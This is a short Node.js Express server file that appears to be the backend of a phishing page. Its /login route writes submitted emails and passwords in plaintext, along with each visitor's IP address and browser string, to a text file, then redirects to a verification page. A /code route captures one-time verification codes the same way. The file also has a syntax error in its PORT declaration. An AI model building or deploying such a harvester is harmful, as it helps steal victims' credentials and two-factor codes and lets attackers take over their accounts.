const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs"); // Import File System module
const app = express();

const PORT process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use("/", express.static("views/"));

// Function to get user IP
function getUserIP(req) {
    return req.headers["x-forwarded-for"] || req.connection.remoteAddress;
}

// Function to save data to a file
function saveToFile(data) {
    const log = `${new Date().toISOString()} - ${data}\n`; // Format data with timestamp
    fs.appendFile("user_data.txt", log, (err) => {
        if (err) console.error("Error saving data:", err);
    });
}

app.post("/login", (req, res) => {
    const { email, password } = req.body;
    const ip = getUserIP(req);
    const userAgent = req.headers["user-agent"]; // Get browser info

    console.log(req.body);
    
    // Save email, password, IP, and browser info
    saveToFile(`IP: ${ip}, Browser: ${userAgent}, Email: ${email}, Password: ${password}`);
    
    // Redirect after 5 seconds
    setTimeout(() => {
        res.redirect("verification.html");
    }, 5000);
});

app.post("/code", (req, res) => {
    const { code } = req.body;
    const ip = getUserIP(req);
    const userAgent = req.headers["user-agent"];

    console.log(req.body);
    
    // Save verification code with IP & browser info
    saveToFile(`IP: ${ip}, Browser: ${userAgent}, Verification Code: ${code}`);
    
    res.status(200).send("");
});

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});
